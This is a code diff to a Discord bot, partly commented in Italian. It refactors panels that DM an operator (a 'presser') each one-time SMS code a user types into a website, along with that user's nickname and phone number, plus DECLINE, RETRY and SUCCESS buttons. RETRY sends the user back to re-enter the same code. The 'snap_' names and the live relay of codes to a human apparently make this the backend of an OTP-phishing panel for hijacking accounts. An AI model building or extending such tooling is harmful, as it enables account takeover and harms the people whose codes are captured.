@@ -429,26 +429,81 @@ class DeclineReasonModal(Modal, title="Decline number"):
                 pass
 
 
-class OTPVerificationView(discord.ui.View):
-    """I 3 bottoni che compaiono nel DM quando l'utente inserisce l'OTP sul sito."""
+def _otp_body(nickname: str, phone: str, code: str, cfg: dict) -> str:
+    body = (
+        f"# {BELL_EMOJI} OTP code received\n"
+        f"**User**\u2003`{nickname}`\n"
+        f"**Phone**\u2003`{phone}`\n\n"
+        f"**Code**\n```{code}```"
+    )
+    ft = (cfg.get("footer_text") or "").strip()
+    if ft:
+        body += f"\n-# {ft}"
+    return body
 
-    def __init__(self, snap_user_id: str, nickname: str, phone: str):
+
+def _otp_result_body(title: str, nickname: str, phone: str, extra: str = "") -> str:
+    body = (
+        f"# {title}\n"
+        f"**User**\u2003`{nickname}`\n"
+        f"**Phone**\u2003`{phone}`"
+    )
+    if extra:
+        body += f"\n\n{extra}"
+    return body
+
+
+class OTPResultView(discord.ui.LayoutView):
+    """Final state after DECLINE / RETRY / SUCCESS (no buttons)."""
+
+    def __init__(self, title: str, nickname: str, phone: str, accent: int, extra: str = ""):
+        super().__init__(timeout=None)
+        container = discord.ui.Container(accent_colour=accent)
+        container.add_item(discord.ui.TextDisplay(
+            _otp_result_body(title, nickname, phone, extra)
+        ))
+        self.add_item(container)
+
+
+class OTPVerificationView(discord.ui.LayoutView):
+    """OTP received panel in Components V2: 3 buttons inside the container."""
+
+    def __init__(self, snap_user_id: str, nickname: str, phone: str, code: str = "", cfg: dict = None):
         super().__init__(timeout=None)
         self.snap_user_id = snap_user_id
         self.nickname = nickname
         self.phone = phone
+        cfg = cfg or {}
 
-    @discord.ui.button(label="DECLINE", style=discord.ButtonStyle.danger, emoji="❌", custom_id="snap_decline")
-    async def decline(self, interaction: discord.Interaction, button: discord.ui.Button):
+        container = discord.ui.Container(accent_colour=0x22C55E)
+        container.add_item(discord.ui.TextDisplay(_otp_body(nickname, phone, code, cfg)))
+        container.add_item(discord.ui.Separator())
+
+        decline_btn = discord.ui.Button(
+            label="DECLINE", style=discord.ButtonStyle.danger,
+            emoji=discord.PartialEmoji.from_str(BAN_EMOJI), custom_id="snap_decline",
+        )
+        retry_btn = discord.ui.Button(
+            label="RETRY", style=discord.ButtonStyle.primary,
+            emoji=discord.PartialEmoji.from_str(EDIT_EMOJI), custom_id="snap_retry",
+        )
+        success_btn = discord.ui.Button(
+            label="SUCCESS", style=discord.ButtonStyle.success,
+            emoji=discord.PartialEmoji.from_str(PLUS_EMOJI), custom_id="snap_success",
+        )
+        decline_btn.callback = self._decline
+        retry_btn.callback = self._retry
+        success_btn.callback = self._success
+        container.add_item(discord.ui.ActionRow(decline_btn, retry_btn, success_btn))
+        self.add_item(container)
+
+    async def _decline(self, interaction: discord.Interaction):
         await interaction.response.send_modal(
             DeclineReasonModal(self.snap_user_id, self.nickname, self.phone)
         )
 
-    @discord.ui.button(label="RETRY", style=discord.ButtonStyle.primary, emoji="🔄", custom_id="snap_retry")
-    async def retry(self, interaction: discord.Interaction, button: discord.ui.Button):
+    async def _retry(self, interaction: discord.Interaction):
         db = _state["db"]
-        # No new code is generated. The user simply re-enters the code they already
-        # received by SMS. We just send them back to the OTP form.
         await db.users.update_one(
             {"id": self.snap_user_id},
             {"$set": {
@@ -467,28 +522,18 @@ class OTPVerificationView(discord.ui.View):
             "discord_user_id": str(interaction.user.id),
             "created_at": now_iso(),
         })
-        await log_action(f"RETRY_CODE, <@{interaction.user.id}> — `{self.nickname}`")
-        embed = discord.Embed(
-            title="🔄 Retry requested",
-            description=f"**User:** `{self.nickname}`\n**Phone:** `{self.phone}`",
-            color=0x3b82f6,
-        )
-        embed.add_field(
-            name="Waiting",
-            value="The user has been sent back to the code form. You'll be pinged here as soon as they re-enter it.",
-            inline=False,
-        )
-        embed.set_footer(text="No new code was generated — the user re-enters the one they already got.")
+        await log_action(f"RETRY_CODE, <@{interaction.user.id}> \u2014 `{self.nickname}`")
         try:
-            await interaction.response.edit_message(embed=embed, view=None)
+            await interaction.response.edit_message(
+                view=OTPResultView(
+                    f"{EDIT_EMOJI} Retry requested", self.nickname, self.phone, 0x3B82F6,
+                    "The user has been sent back to the code form. No new code was generated \u2014 they re-enter the one they already got.",
+                )
+            )
         except Exception:
-            try:
-                await interaction.response.send_message(f"🔄 New code: `{new_code}`", ephemeral=True)
-            except Exception:
-                pass
+            pass
 
-    @discord.ui.button(label="SUCCESS", style=discord.ButtonStyle.success, emoji="✅", custom_id="snap_success")
-    async def success(self, interaction: discord.Interaction, button: discord.ui.Button):
+    async def _success(self, interaction: discord.Interaction):
         db = _state["db"]
         await db.users.update_one(
             {"id": self.snap_user_id},
@@ -510,19 +555,16 @@ class OTPVerificationView(discord.ui.View):
             "discord_user_id": str(interaction.user.id),
             "created_at": now_iso(),
         })
-        await log_action(f"ADMIN_APPROVED, <@{interaction.user.id}> — `{self.nickname}`")
-        embed = discord.Embed(
-            title="✅ Success",
-            description=f"**User:** `{self.nickname}`\n**Phone:** `{self.phone}`\nAccess approved.",
-            color=0x22c55e,
-        )
+        await log_action(f"ADMIN_APPROVED, <@{interaction.user.id}> \u2014 `{self.nickname}`")
         try:
-            await interaction.response.edit_message(embed=embed, view=None)
+            await interaction.response.edit_message(
+                view=OTPResultView(
+                    f"{PLUS_EMOJI} Success", self.nickname, self.phone, 0x22C55E,
+                    "Access approved.",
+                )
+            )
         except Exception:
-            try:
-                await interaction.response.send_message("✅ Approved.", ephemeral=True)
-            except Exception:
-                pass
+            pass
 
 
 async def notify_otp_received(user: dict, code: str):
@@ -536,18 +578,9 @@ async def notify_otp_received(user: dict, code: str):
         return False, "no presser"
     try:
         u_disc = await _state["bot"].fetch_user(int(presser_id))
-        embed = discord.Embed(
-            title="🎯 OTP code received",
-            description=f"**User:** `{user['nickname']}`\n**Phone:** `{user['phone']}`",
-            color=0x22c55e,
-        )
-        embed.add_field(name="Code", value=f"```{code}```", inline=False)
-        ft = (cfg.get("footer_text") or "").strip()
-        if ft:
-            embed.set_footer(text=ft)
-        view = OTPVerificationView(user["id"], user["nickname"], user["phone"])
+        view = OTPVerificationView(user["id"], user["nickname"], user["phone"], code, cfg)
         dm = await u_disc.create_dm()
-        msg = await dm.send(embed=embed, view=view)
+        msg = await dm.send(view=view)
         await _state["db"].users.update_one({"id": user["id"]}, {"$set": {"otp_message_id": str(msg.id)}})
         await log_action(f"📨 OTP `{code}` ricevuto per `{user['nickname']}` — DM a <@{presser_id}>")
         return True, "sent"
@@ -719,6 +752,10 @@ ALERT_EMOJI = "<a:Alert:1537938372822040716>"
 FLASH_EMOJI = "<a:Flash:1542636354192805888>"
 SHOP_EMOJI = "<a:shopping:1537938659716894731>"
 CALL_EMOJI = "<:call:1543572200643240016>"
+BELL_EMOJI = "<:bell:1542637989908320277>"
+BAN_EMOJI = "<:ban:1542637913630838825>"
+EDIT_EMOJI = "<:edit:1542638029309616128>"
+PLUS_EMOJI = "<:plus:1543572780136792134>"
 
 
 def _fmt_secs(sec: int) -> str:
